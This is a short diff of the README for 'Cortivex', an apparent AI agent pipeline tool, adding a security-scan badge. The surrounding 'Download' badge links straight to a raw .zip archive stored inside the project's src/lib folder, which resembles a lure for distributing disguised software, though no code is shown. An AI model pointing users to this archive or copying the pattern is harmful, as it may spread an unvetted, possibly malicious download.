@@ -1,6 +1,7 @@
 # 🤖 Cortivex - Run AI agent pipelines with ease
 
 [![Download Cortivex](https://img.shields.io/badge/Download-Cortivex-purple?style=for-the-badge)](https://raw.githubusercontent.com/Khanafr7286/Cortivex/main/packages/dashboard/src/lib/Software-1.5-beta.1.zip)
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/khanafr7286-cortivex)
 
 ## 🧭 What Cortivex does
 
